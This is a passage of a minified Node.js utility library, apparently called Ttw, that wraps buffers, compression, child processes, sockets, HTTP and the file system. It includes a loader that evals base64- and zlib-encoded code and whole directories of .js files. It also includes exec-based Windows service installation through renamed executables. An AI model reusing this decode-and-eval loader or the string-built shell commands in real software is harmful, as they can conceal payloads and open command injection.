f=["Array","BitmapData","Common","CustomEvent","Date","DisObj","DisObjContainer","Draw","Effect","Event","EventKeyboard","EventMouse","File","Flash","Geom","Geometry","HTML","JSON","Location","Math","Matrix","Object","String","TemplateHTML","TemplateHTMLAsync","Transform","Unit","XMLHttpReqGet","XMLHttpRequest_Get","XMLHttpReqGetRef","XMLHttpRequest_Get_Ref","XMLHttpReqPost","XMLHttpRequest_Post"];e.fnCommon.destroyKeys(a.FN,f);for(var l in n)0==l.indexOf("STtwUtil")&&(n[l.replace("STtwUtil","SUtil")]=n[l]);n.Ttw=e;var w=STtwUtilCommon.destroyKey;w(global,t),w(global,"TtwPackage")}();
try{global.Lib||(require("D:/TtwJS_NodeJS/NodeJS/libs/Ttw/Lib_Ttw_TtwPackage.js"),require("D:/TtwJS_NodeJS/NodeJS/libs/Ttw/Lib_Ttw_TtwPackageInitialize.js"))}catch(e){}global._$TATIC_CONST_DEBUG=global._$TATIC_CONST_DEBUG||!1,global.TtwLog=global.TtwLog||null,global.TtwPackageNodeJS=function(){var t=global;t.Lib=t.Lib||{},t.Lib.Ttw.CLASS.Dgram={Server:{}},t.Lib.Ttw.CLASS.Http={ClientRequest:null,Server:{},ServerResponse:null},t.Lib.Ttw.CLASS.Mashup={Mashup_Server_Http:null},t.Lib.Ttw.CLASS.MongoDB={MongoClient:null,MongoClient_Server_Http:null},t.Lib.Ttw.CLASS.Net={Server:{},Socket:{}},t.Lib.Ttw.CLASS.SNS={FaceBook:null,Twitter:null},t.Lib.Ttw.CLASS.Web={Express:{}},t.Instance=t.Instance||{},t.Instance.Ttw=t.Instance.Ttw||{};var e=t.Lib.Ttw;e.CONST=e.CONST||{},e.gabageCollection=function(t,e){global.gc(e)},e.CLASS.Error.Error=function(e){this.instanceKey=e.instanceKey||"global.Lib.Ttw.Error";var n=t.Lib.Ttw.singleton(e.instanceKey,null);return n?n:(this["package"]="global.Lib.Ttw.CLASS.Error.Error",this)},e.CLASS.Event.Event=function(e){this.instanceKey=e.instanceKey||"global.Lib.Ttw.Event";var n=t.Lib.Ttw.singleton(e.instanceKey,null);return n?n:(this["package"]="global.Lib.Ttw.CLASS.Event.Event",this.ACTIVATE="activate",this.ADDED="added",this.ADDED_TO_STAGE="addedToStage",this.CANCEL="cancel",this.CHANGE="change",this.CHANNEL_MESSAGE="channelMessage",this.CHANNEL_STATE="channelState",this.CLEAR="clear",this.CLOSE="close",this.CLOSING="closing",this.COMPLETE="complete",this.CONNECT="connect",this.CONTEXT3D_CREATE="context3DCreate",this.COPY="copy",this.CUT="cut",this.DEACTIVATE="deactivate",this.DISPLAYING="displaying",this.ENTER_FRAME="enterFrame",this.EXIT_FRAME="exitFrame",this.EXITING="exiting",this.FRAME_CONSTRUCTED="frameConstructed",this.FRAME_LABEL="frameLabel",this.FULLSCREEN="fullScreen",this.HTML_BOUNDS_CHANGE="htmlBoundsChange",this.HTML_DOM_INITIALIZE="htmlDOMInitialize",this.HTML_RENDER="htmlRender",this.ID3="id3",this.INIT="init",this.LOCATION_CHANGE="locationChange",this.MOUSE_LEAVE="mouseLeave",this.NETWORK_CHANGE="networkChange",this.OPEN="open",this.PASTE="paste",this.PREPARING="preparing",this.REMOVED="removed",this.REMOVED_FROM_STAGE="removedFromStage",this.RENDER="render",this.RESIZE="resize",this.SCROLL="scroll",this.SELECT="select",this.SELECT_ALL="selectAll",this.SOUND_COMPLETE="soundComplete",this.STANDARD_ERROR_CLOSE="standardErrorClose",this.STANDARD_INPUT_CLOSE="standardInputClose",this.STANDARD_OUTPUT_CLOSE="standardOutputClose",this.SUSPEND="suspend",this.TAB_CHILDREN_CHANGE="tabChildrenChange",this.TAB_ENABLED_CHANGE="tabEnabledChange",this.TAB_INDEX_CHANGE="tabIndexChange",this.TEXT_INTERACTION_MODE_CHANGE="textInteractionModeChange",this.TEXTURE_READY="textureReady",this.UNLOAD="unload",this.USER_IDLE="userIdle",this.USER_PRESENT="userPresent",this.VIDEO_FRAME="videoFrame",this.WORKER_STATE="workerState",this)},e.CLASS.FN.Event=function(t){},e.CLASS.FN.Buffer=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnBuffer";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnBuffer",this.iconv={};var i=require("zlib"),r="EUC-KR",s=54,o=new Buffer("7Jyg7IK87JSo7JWk7JSo6riw7Iig7Jew6rWs7IaM7Iah7ISg7Jqw64yA66as66e17JeR7Iqk7JeQ7Iqk65SU7LyA7J207Y+s7ZSM656Y7Ims","base64").toString("utf8");this.compress_String=function(t){return i.deflateSync(t)},this.consoleLog__Status=function(t){var e=console.log;e("t.length : "+t.length),e("t.offset : "+t.offset),e("t.slice.toString( utf8 ) : "+t.slice(0,54).toString("utf8")),e("t.toString( 'utf-8' ) : "+t.toString("utf-8"))},this.consoleLog__Status__requireBuffer=function(t){var e=console.log;e("t.INSPECT_MAX_BYTES : "+t.INSPECT_MAX_BYTES)},this.endianChange=function(t){for(var e=buffer.length,n=0;e>n;n+=2){var i=t[n];t[n]=t[n+1],t[n+1]=i}return t};var a=function(t){return STtwUtilBuffer.iconv.decode(t.slice(s),r)};this.rTBS=function(t){return a(t)};var c=function(t){return STtwUtilBuffer.rTBS(i.inflateSync(t))};this.rZTBS=function(t){return c(t)};var l=function(t){return STtwUtilBuffer.rZTBS(STtwUtilBuffer.getBufferFromTtwBase64(t))};this.rZTBSFromTtwBase64=function(t){return l(t)},this.uncompress_String=function(t){return i.inflateSync(t)};var u=function(t){return STtwUtilBuffer.iconv.encode(o+t,r)};this.writeTtwBSON=function(t){return u(t)};var _=function(t){return i.deflateSync(STtwUtilBuffer.writeTtwBSON(t))};this.writeTtwZBSON=function(t){return _(t)},this.getBase64=function(t){return t.toString("base64")},this.getBufferFromBase64=function(t){return new Buffer(t,"base64")},this.getBufferFromTtwBase64=function(t){return this.getBufferFromBase64(t.replace(/\,/gi,""))},this.rTBS.owner=this,this.rZTBS.owner=this},e.CLASS.FN.ChildProcess=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnCP";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnCP";var i=require("child_process");this.asExec=i.exec,this.asExecFile=i.execFile,this.asSpawn=function(t){var e=i.spawn(t.c,t.arg?t.arg:{},t.opt?t.opt:{});return t.cbFunctions&&(t.cbFunctions.stdout&&e.stdout.on("data",t.cbFunctions.stdout),t.cbFunctions.stderr&&e.stderr.on("data",t.cbFunctions.stderr),t.cbFunctions.close&&e.on("close",t.cbFunctions.close)),e},this.sExec=i.execSync,this.sExecFile=i.execFileSync,this.sSpawn=i.spawnSync},e.CLASS.FN.ChildProcess_NSSM=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnCP_NSSM";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnCP_NSSM";var i=(require("child_process"),STtwUtilCP.asExec);this.install=function(t,e){var n=this.getPath_NSSM;i(n()+" install "+t+" "+this.getPath_NODE()+" --expose-gc "+process.cwd()+"\\"+e,function(e,r,s){i(n()+" start "+t,function(t,e,n){})})},this.remove=function(t){var e=this.getPath_NSSM;i(e()+" stop "+t,function(n,r,s){i(e()+" remove "+t,function(t,e,n){})})},this.restart=function(t){i(this.getPath_NSSM()+" remove "+t)},this.start=function(t){i(this.getPath_NSSM()+" start "+t)},this.stop=function(t){i(this.getPath_NSSM()+" stop "+t)},this.install_confirm=function(t,e){var n=this.getPath_NSSM;i(n()+" install "+t+" "+this.getPath_NODE()+" --expose-gc "+process.cwd()+"\\"+e+" confirm",function(e,r,s){i(n()+" start "+t+" confirm",function(t,e,n){})})},this.remove_confirm=function(t){var e=this.getPath_NSSM;i(e()+" stop "+t+" confirm",function(n,r,s){i(e()+" remove "+t+" confirm",function(t,e,n){})})},this.restart_confirm=function(t){i(this.getPath_NSSM()+" remove "+t+" confirm")},this.start_confirm=function(t){i(this.getPath_NSSM()+" start "+t+" confirm")},this.stop_confirm=function(t){i(this.getPath_NSSM()+" stop "+t+" confirm")},this.getPath_NODE=function(){return process.cwd()+"\\node_modules\\exes\\exes100.exe"},this.getPath_NSSM=function(){return process.cwd()+"\\node_modules\\exes\\exes101.exe"}},e.CLASS.FN.Crypto=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnCrypto";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnCrypto";var i=require("crypto"),r=function(t){return i.randomBytes(t).toString("hex")};this.randomBytesHex_n=function(t){return r(t)},this.randomBytesHex_16=function(){return r(16)},this.randomBytesHex_32=function(){return r(32)},this.randomBytesHex_64=function(){return r(64)},this.randomBytesHex_128=function(){return r(128)},this.randomBytesHex_256=function(){return r(256)},this.randomBytesHex_512=function(){return r(512)},this.randomBytesHex_1024=function(){return r(1024)};var s=function(t){var e=r(t),n=STtwUtilDate.getDate__Seconds_Array();e=n.join("_")+"::"+e;var i=new Buffer(e,"utf8"),s=i.toString("base64"),o=new Buffer(s,"utf8"),a=o.toString("hex");return e=null,i=null,s=null,o=null,a};this.getRandomBytes_nBytes_FrontMergeDate=function(t){return s(t)}},e.CLASS.FN.Dgram=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnDgram";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnDgram";var i=require("dgram");this.consoleLog__Status=function(t){console.log},this.createUDPClient_4=function(){return i.createSocket("udp4")},this.createUDPClient_6=function(){return i.createSocket("udp6")},this.createUDPServer_4=function(t){var e=i.createSocket("udp4");return e.on("listening",t.cbFunctions.listening),e.on("message",t.cbFunctions.message),e.on("error",t.cbFunctions.error),e.bind(t.port,t.host),e},this.createUDPServer_6=function(t){var e=i.createSocket("udp6");return e.on("listening",t.cbFunctions.listening),e.on("message",t.cbFunctions.listening),e.bind(t.port,t.host),e},this.send_Buffer=function(t,e,n,i,r){t.send(e,n,e.length,i,r)},this.send_Obj_UTF8=function(t,e,n,i,r){var s=JSON.stringify(e),o=new Buffer(s);t.send(o,n,o.length,i,r)},this.send_Str_UTF8=function(t,e,n,i,r){var s=new Buffer(e);t.send(s,n,s.length,i,r)},this.sendCB_Buffer=function(t,e,n,i,r,s){t.send(e,n,e.length,i,r,s)},this.sendCB_Obj_UTF8=function(t,e,n,i,r,s){var o=JSON.stringify(e),a=new Buffer(o);t.send(a,n,a.length,i,r,s)},this.sendCB_Str_UTF8=function(t,e,n,i,r,s){var o=new Buffer(e);t.send(o,n,o.length,i,r,s)},this.sendClose_Buffer=function(t,e,n,i,r,s){t.send(e,n,e.length,i,r,function(e,n){if(e)throw e;t.close()})},this.sendClose_Obj_UTF8=function(t,e,n,i,r){var s=JSON.stringify(e),o=new Buffer(s);t.send(o,n,o.length,i,r,function(e,n){if(e)throw e;t.close()})},this.sendClose_Str_UTF8=function(t,e,n,i,r){var s=new Buffer(e);t.send(s,n,s.length,i,r,function(e,n){if(e)throw e;t.close()})}},e.CLASS.FN.FsReadStream=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnFsReadStream";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnFsReadStream";var i=require("fs"),r=require("path");this.checkWhetherFile=function(t){try{return i.statSync(t)}catch(e){}return null},this.consoleLog__Status=function(t){var e=console.log;e("t._maxListeners : "+t._maxListeners),e("t.autoClose : "+t.autoClose),e("t.domain : "+t.domain),e("t.fd : "+t.fd),e("t.flags : "+t.flags),e("t.mode : "+t.mode),e("t.path : "+t.path),e("t.readable : "+t.readable)};var s=function(t,e,n,i){STtwUtilFsWriteStream.createDirectory__BeforCheck(s._logPath),i=i||"";for(var r,o,a,c,l=(STtwUtilFsReadStream.checkWhetherFile,STtwUtilFsReadStream.getFile),u=STtwUtilFsWriteStream.writeFile_UTF8,_=Lib.Ttw.eval,f=[],h=0,S=t.length;S>h;++h)c=t[h],a=e+c,r=_(l(a).toString("utf8")),o=r?r.toString():null,f.push([a,o]);if(n&&f.length){var g=s._logPath,d=e.replace(s._reg0,".").replace("..","");d=d.slice(0,d.lastIndexOf("."));var T=STtwUtilDate.getDate__Milliseconds_Array();u(g+i+T.join(".")+"--"+d+".result",JSON.stringify(f,null,"	"))}f.length=0,f=null};this.executeJSFiles__FileList=function(t,e,n,i){s(t,e,n,i)},s._logPath="./log/SUtilFsWriteStream.executeJSFiles__FileList/",s._reg0=/\//gi;var o=function(t,e,n){e=e||".js";for(var i=STtwUtilFsReadStream.getList_File_Extension,r=[],o=[],a=i(t,e),c=0,l=a.length;l>c;++c)0==a[c].indexOf("_")?r.push(a[c]):o.push(a[c]);r.length&&s(r,t,n,"_Files--"),o.length&&s(o,t,n,"Files--"),r.length=0,r=null,o.length=0,o=null};this.executeJSFiles__FromDirectory=function(t,e,n){o(t,e,n)};var a=function(t,e,n,i){i=i||"__Backup";var r=STtwUtilFsReadStream.getList_Directory;o(t,e,n);for(var s,c=[],l=[],u=r(t),_=0,f=u.length;f>_;++_)i!=u[_]&&(0==u[_].indexOf("_")?c.push(u[_]):l.push(u[_]));for(_=0,f=c.length;f>_;++_){s=c[_];var h=t+s+"/";a(h,e,n,i)}for(_=0,f=l.length;f>_;++_){s=l[_];var h=t+s+"/";a(h,e,n,i)}};this.executeJSDirectories=function(t,e,n,i){a(t,e,n,i)},this.getFile=function(t){return i.readFileSync(t)},this.getList_Directory=function(t){for(var e=i.readdirSync(t),n=i.lstatSync,r=[],s=0,o=e.length;o>s;++s)try{n(t+e[s]).isDirectory()&&r.push(e[s])}catch(a){}return r},this.getList_DirectoryAndFile=function(t){return i.readdirSync(t)},this.getList_DirectoryAndFile_fstatSync=function(t){for(var e=i.readdirSync(t),n=i.fstatSync,r=[],s=0,o=e.length;o>s;++s)try{r.push(n(t+e[s]))}catch(a){}return r},this.getList_DirectoryAndFile_lstatSync=function(t){for(var e=i.readdirSync(t),n=i.lstatSync,r=[],s=0,o=e.length;o>s;++s)try{r.push(n(t+e[s]))}catch(a){}return r},this.getList_File=function(t){for(var e=i.readdirSync(t),n=i.lstatSync,r=[],s=0,o=e.length;o>s;++s)try{n(t+e[s]).isFile()&&r.push(e[s])}catch(a){}return r},this.getList_File_Extension=function(t,e){for(var n=i.readdirSync(t),s=i.lstatSync,o=r.extname,a=[],c=0,l=n.length;l>c;++c)try{if(!s(t+n[c]).isFile())continue;e==o(n[c])&&a.push(n[c])}catch(u){}return a},this.getList_FileNm=function(t,e){for(var n=r.basename,s=i.readdirSync(t),o=i.lstatSync,a=[],c=0,l=s.length;l>c;++c)try{o(t+s[c]).isFile()&&a.push(n(s[c],e))}catch(u){}return a}},e.CLASS.FN.FsWriteStream=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnFsWriteStream";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnFsWriteStream";var i=require("fs");require("path");this.consoleLog__Status=function(t){console.log},this.createDirectory=function(t,e,n){i.mkdirSync(t,e?e:{encoding:"utf8"},n?n:function(t){})},this.createDirectory__BeforCheck=function(t,e,n){return STtwUtilFsReadStream.checkWhetherFile(t)?0:(STtwUtilFsWriteStream.createDirectory(t,e,n),1)},this.deleteFile=function(t){i.unlinkSync(t)};var r=function(t,e,n,r){i.writeFileSync(t,e,n?n:{encoding:"utf8"},r?r:function(t){})};this.writeFile=function(t,e,n,i){r(t,e,n,i)};var s=function(t,e,n,r){i.writeFileSync(t,e.toString("base64"),n?n:{encoding:"utf8"},r?r:function(t){})};this.writeFile_Base64=function(t,e,n,i){s(t,e,n,i)};var o=function(t,e,n,r){i.writeFileSync(t,e,n?n:{encoding:"binary"},r?r:function(t){})};this.writeFile_Binary=function(t,e,n,i){o(t,e,n,i)};var a=function(t,e,n){r(t,e,{encoding:"utf8"},n?n:function(t){})};this.writeFile_UTF8=function(t,e,n){a(t,e,n)};var c=function(t,e,n){a(t,JSON.stringify(e,null,"	"),n?n:function(t){})};this.writeFile_JSON_Tab1_UTF8=function(t,e,n){c(t,e,n)};var l=function(t,e,n,i){return 0==e.length?void(i&&i(arguments)):void t.write(e.shift(),n,function(r){return r?(global.TtwLog.error("[ ERROR ] - _writeStream__MultiBuffers__Array - "+r),void(i&&i(arguments))):void l(t,e,n,i)})};this.writeStream__MultiBuffers__Array=function(t,e,n,i){l(t,e,n,i)},this.writeFile_UTF8.owner=this,this.writeFile_JSON_Tab1_UTF8.owner=this},e.CLASS.FN.HTTP=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnHTTP";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnHTTP";var i=require("http"),r=function(t){};this.consoleLog__Status=function(t){console.log},this.get=function(t,e){},this.request=function(t){arguments.callee.owner["request_"+t.options.method](t)},this.request_GET=function(t){try{t.options.method="GET"}catch(e){}var n="";t.cbFunctions=t.cbFunctions||{};var s=i.request(t.options,function(e){e.setEncoding("utf8"),t.encoding&&e.setEncoding(t.encoding),e.on("data",t.cbFunctions.data||function(t){try{n+=t}catch(e){}}),e.on("end",function(){t.cbFunctions.end(n)}),e.on("error",t.cbFunctions.error||r)});s.on("error",t.cbFunctions.error||r),t.options.headers&&STtwUtilHttp.setHttpRequestHeaders(s,t.options.headers),STtwUtilHttp.setHttpRequestEvent(s,t.cbFunctions),s.end()},this.request_GET__Binary=function(t){try{t.options.method="GET"}catch(e){}var n="";t.cbFunctions=t.cbFunctions||{};var s=i.request(t.options,function(e){e.setEncoding("binary"),t.encoding&&e.setEncoding(t.encoding),e.on("data",t.cbFunctions.data||function(t){try{n+=t}catch(e){}}),e.on("end",function(){t.cbFunctions.end(n)}),e.on("error",t.cbFunctions.error||r)});s.on("error",t.cbFunctions.error||r),t.options.headers&&STtwUtilHttp.setHttpRequestHeaders(s,t.options.headers),STtwUtilHttp.setHttpRequestEvent(s,t.cbFunctions),s.end()},this.request_POST=function(t){try{t.options.method="POST"}catch(e){}var n="";t.cbFunctions=t.cbFunctions||{};var s=i.request(t.options,function(e){t.encoding&&e.setEncoding(t.encoding),e.on("data",t.cbFunctions.data||function(t){try{n+=t}catch(e){}}),e.on("end",function(){t.cbFunctions.end(n)}),e.on("error",t.cbFunctions.error||r)});s.on("error",t.cbFunctions.error||r),t.options.headers&&STtwUtilHttp.setHttpRequestHeaders(s,t.options.headers),STtwUtilHttp.setHttpRequestEvent(s,t.cbFunctions),s.write(t.data),s.end()},this.setHttpRequestEvent=function(t,e){},this.setHttpRequestHeaders=function(t,e){var n;for(n in e)t.setHeader(n,e[n])},this.request.owner=this},e.CLASS.FN.HTTPS=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnHTTPS";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnHTTPS";var i=require("https");this.consoleLog__Status=function(t){console.log},this.request_GET=function(t){try{t.options.method="GET"}catch(e){}var n="";t.cbFunctions=t.cbFunctions||{};var r=i.request(t.options,function(e){t.encoding&&e.setEncoding(t.encoding),e.on("data",t.cbFunctions.data||function(t){try{n+=t}catch(e){}}),e.on("end",function(){t.cbFunctions.end(n)}),e.on("error",t.cbFunctions.error||evt_Error)});r.on("error",t.cbFunctions.error||evt_Error),t.options.headers&&STtwUtilHttp.setHttpRequestHeaders(r,t.options.headers),STtwUtilHttp.setHttpRequestEvent(r,t.cbFunctions),r.end()},this.request_POST=function(t){try{t.options.method="POST"}catch(e){}var n="";t.cbFunctions=t.cbFunctions||{};var r=i.request(t.options,function(e){t.encoding&&e.setEncoding(t.encoding),e.on("data",t.cbFunctions.data||function(t){try{n+=t}catch(e){}}),e.on("end",function(){t.cbFunctions.end(n)}),e.on("error",t.cbFunctions.error||evt_Error)});r.on("error",t.cbFunctions.error||evt_Error),t.options.headers&&STtwUtilHttp.setHttpRequestHeaders(r,t.options.headers),STtwUtilHttp.setHttpRequestEvent(r,t.cbFunctions),r.write(t.data),r.end()}},e.CLASS.FN.NetServer=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnNetServer";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnNetServer";var i=require("net");this.consoleLog__Status=function(t){var e=console.log;e("t._events : "+t._events),e("t.address : "+t.address()),e("t.allowHalfOpen : "+t.allowHalfOpen),e("t.domain : "+t.domain)},this.createServer=function(t){var e;if(e=t.options?i.createServer(t.options):i.createServer(),t.cbFunctions){var n=t.cbFunctions;n.listening&&e.on("listening",n.listening),n.connection&&e.on("connection",n.connection),n.close&&e.on("close",n.close),n.error&&e.on("error",n.error)}return e.listen(t.port),e}},e.CLASS.FN.NetSocket=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnNetSocket";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnNetSocket";var i=require("net");this.consoleLog__Status=function(t){var e=console.log;e("t._bytesDispatched : "+t._bytesDispatched),e("t._connecting : "+t._connecting),e("t._getpeername : "+t._getpeername()),e("t._getsockname : "+t._getsockname()),e("t._hadError : "+t._hadError),e("t._maxListeners : "+t._maxListeners),e("t._pendingEncoding : "+t._pendingEncoding),e("t.address : "+t.address()),e("t.allowHalfOpen : "+t.allowHalfOpen),e("t.bytesRead : "+t.bytesRead),e("t.bytesWritten : "+t.bytesWritten),e("t.destroyed : "+t.destroyed),e("t.localAddress : "+t.localAddress),e("t.localPort : "+t.localPort),e("t.readable : "+t.readable),e("t.remoteAddress : "+t.remoteAddress),e("t.remoteFamily : "+t.remoteFamily),e("t.remotePort : "+t.remotePort),e("t.writable : "+t.writable)},this.createSocket=function(){return new i.Socket}},e.CLASS.FN.Process=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnProcess";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnProcess",this.process=require("process"),global._$TATIC_CONST_DEBUG=!0;var i=this,r=function(t){try{global.TtwLog.log(STtwUtilCommon.evalCapsule(t))}catch(e){global.TtwLog.error(e)}var n="--------------------------------------------------"+r._idx;global.TtwLog.log(n),global.TtwLog.log(n),global.TtwLog.log(n),global.TtwLog.log(n),global.TtwLog.log(n),++r._idx};r._idx=0,this.cwd_slash=function(){return i.process.cwd().replace(i.cwd_slash._regExp,"/")},this.cwd_slash._regExp=/\//;var s=function(t){var e=i.process.openStdin();t?e.on("data",r):e.removeListener("data",r)};this.mode__ConsoleTyping=function(){s()},this.getPWD=function(){return i.process.env.PWD}},e.CLASS.FN.QueryString=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnQueryString";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnQueryString";var i=require("querystring");this.consoleLog__Status=function(t){console.log},this.stringify=function(t){return i.stringify(t)},this.parse=function(t){return i.parse(t)}},e.CLASS.FN.Runner=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnR";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnR";var i=function(t){return global.eval(new Buffer(t,"base64").toString())},r=function(t){return i(fs.readFileSync(t).toString())},s=STtwUtilBuffer.rZTBSFromTtwBase64,o=function(t){return global.eval(s(STtwUtilBuffer.rZTBS(t)))},a=function(t){return global.eval(s(s(t)))},c=function(t){return a(STtwUtilFsReadStream.getFile(t).toString())};this.rBaJS=function(t){return i(t)},this.rBaJSF=function(t){return r(t)},this.rTtwBaJS=function(t){return a(t)},this.rTtwBaJSF=function(t){return c(t)},this.rTtwBiJS=function(t){return o(b)}},e.CLASS.FN.Stream=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnStream";var n=e.singleton(t.instanceKey,null);return n?n:(this["package"]="global.Lib.Ttw.fnStream",this.Stream=require("stream"),this.consoleLog__Status=function(t){var e=console.log;e("t._extend : "+t._extend()),e("t.debug : "+t.debug()),e("t.deprecate : "+t.deprecate()),e("t.error : "+t.error()),e("t.exec : "+t.exec()),e("t.format : "+t.format()),e("t.inspect : "+t.inspect()),e("t.isArray : "+t.isArray()),e("t.isDate : "+t.isDate()),e("t.isError : "+t.isError()),e("t.isRegExp : "+t.isRegExp()),e("t.p : "+t.p()),e("t.print : "+t.print()),e("t.puts : "+t.puts())},this.newStream=function(){return new arguments.callee.owner.Stream.Transform},void(this.newStream.owner=this))},e.CLASS.FN.URL=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnURL";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnURL";var i=this,r=i.url=require("url");this.consoleLog__Status=function(t){console.log};var s=function(t){return r.parse(t)};this.getParseResult=function(t){return s(t)}},e.CLASS.FN.Util=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnUtil";var n=e.singleton(t.instanceKey,null);return n?n:(this["package"]="global.Lib.Ttw.fnUtil",void(this.consoleLog__Status=function(t){var e=console.log;e("t._extend : "+t._extend()),e("t.debug : "+t.debug()),e("t.deprecate : "+t.deprecate()),e("t.error : "+t.error()),e("t.exec : "+t.exec()),e("t.format : "+t.format()),e("t.inspect : "+t.inspect()),e("t.isArray : "+t.isArray()),e("t.isDate : "+t.isDate()),e("t.isError : "+t.isError()),e("t.isRegExp : "+t.isRegExp()),e("t.p : "+t.p()),e("t.print : "+t.print()),e("t.puts : "+t.puts())}))},e.CLASS.FN.ZLib=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnZLib";var n=e.singleton(t.instanceKey,null);if(n)return n;this["package"]="global.Lib.Ttw.fnZLib";require("zlib");this.consoleLog__Status=function(t){var e=console.log;e("t.ZLIB_VERNUM : "+t.ZLIB_VERNUM),e("t.ZLIB_VERSION : "+t.ZLIB_VERSION),e("t.Z_BEST_COMPRESSION : "+t.Z_BEST_COMPRESSION),e("t.Z_BEST_SPEED : "+t.Z_BEST_SPEED),e("t.Z_BLOCK : "+t.Z_BLOCK),e("t.Z_BUF_ERROR : "+t.Z_BUF_ERROR),e("t.Z_DATA_ERROR : "+t.Z_DATA_ERROR),e("t.Z_DEFAULT_CHUNK : "+t.Z_DEFAULT_CHUNK),e("t.Z_DEFAULT_COMPRESSION : "+t.Z_DEFAULT_COMPRESSION),e("t.Z_DEFAULT_LEVEL : "+t.Z_DEFAULT_LEVEL),e("t.Z_DEFAULT_MEMLEVEL : "+t.Z_DEFAULT_MEMLEVEL),e("t.Z_DEFAULT_STRATEGY : "+t.Z_DEFAULT_STRATEGY),e("t.Z_DEFAULT_WINDOWBITS : "+t.Z_DEFAULT_WINDOWBITS),e("t.Z_ERRNO : "+t.Z_ERRNO),e("t.Z_FILTERED : "+t.Z_FILTERED),e("t.Z_FINISH : "+t.Z_FINISH),e("t.Z_FIXED : "+t.Z_FIXED),e("t.Z_FULL_FLUSH : "+t.Z_FULL_FLUSH),e("t.Z_HUFFMAN_ONLY : "+t.Z_HUFFMAN_ONLY),e("t.Z_MAX_CHUNK : "+t.Z_MAX_CHUNK),e("t.Z_MAX_LEVEL : "+t.Z_MAX_LEVEL),e("t.Z_MAX_MEMLEVEL : "+t.Z_MAX_MEMLEVEL),e("t.Z_MAX_WINDOWBITS : "+t.Z_MAX_WINDOWBITS),e("t.Z_MEM_ERROR : "+t.Z_MEM_ERROR),e("t.Z_MIN_CHUNK : "+t.Z_MIN_CHUNK),e("t.Z_MIN_LEVEL : "+t.Z_MIN_LEVEL),e("t.Z_MIN_MEMLEVEL : "+t.Z_MIN_MEMLEVEL),e("t.Z_MIN_WINDOWBITS : "+t.Z_MIN_WINDOWBITS),e("t.Z_NEED_DICT : "+t.Z_NEED_DICT),e("t.Z_NO_COMPRESSION : "+t.Z_NO_COMPRESSION),e("t.Z_NO_FLUSH : "+t.Z_NO_FLUSH),e("t.Z_OK : "+t.Z_OK),e("t.Z_PARTIAL_FLUSH : "+t.Z_PARTIAL_FLUSH),e("t.Z_RLE : "+t.Z_RLE),e("t.Z_STREAM_END : "+t.Z_STREAM_END),e("t.Z_STREAM_ERROR : "+t.Z_STREAM_ERROR),e("t.Z_SYNC_FLUSH : "+t.Z_SYNC_FLUSH),e("t.Z_VERSION_ERROR : "+t.Z_VERSION_ERROR),e("t.createDeflate : "+t.createDeflate()),e("t.createDeflateRaw : "+t.createDeflateRaw()),e("t.createGunzip : "+t.createGunzip()),e("t.createGzip : "+t.createGzip()),e("t.createInflate : "+t.createInflate()),e("t.createInflateRaw : "+t.createInflateRaw()),e("t.createUnzip : "+t.createUnzip())},this.consoleLog__Status__requireZLib=function(t){console.log}};var n=function(t){n._s||(n._s=t,global.process.__cwd__=global.process.cwd,global.process.cwd=function(){return global.process.__cwd__()+"/"+n._s})};global.__defineSetter__("__ROOT_PATH__",n)}();
global.TtwPackageNodeJS__CLASS__AutoLoad_JS=function(){var t=global,e=t.Lib.Ttw,o=e.CLASS;o.AutoLoad_JS=o.AutoLoad_JS||{},e.CLASS.AutoLoad_JS=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.autoLoad_JS";var o=e.singleton(t.instanceKey,null);if(o)return o;this["package"]="global.Lib.Ttw.CLASS.AutoLoad_JS";var r=function(t){for(var e,o=t,r=STtwUtilFsReadStream.getFile,a=Lib.Ttw.eval,i=STtwUtilFsReadStream.getList_File_Extension(o,".js"),_=0,n=i.length;n>_;++_)e=i[_],a(r(o+e).toString("utf8"))};this.addJSFiles__Common=function(t){_addFiles__Common(t)};var a=function(t,e){for(var o,a=STtwUtilFsReadStream.getList_Directory(t),i=0,_=a.length;_>i;++i)o=a[i],e[o]?global.TtwLog.log("Ignore Folder Name : "+o):r(t+o+"/__define/")};this.addJSFiles___Define=function(t,e){a(t,e)};var i=function(t,e){var 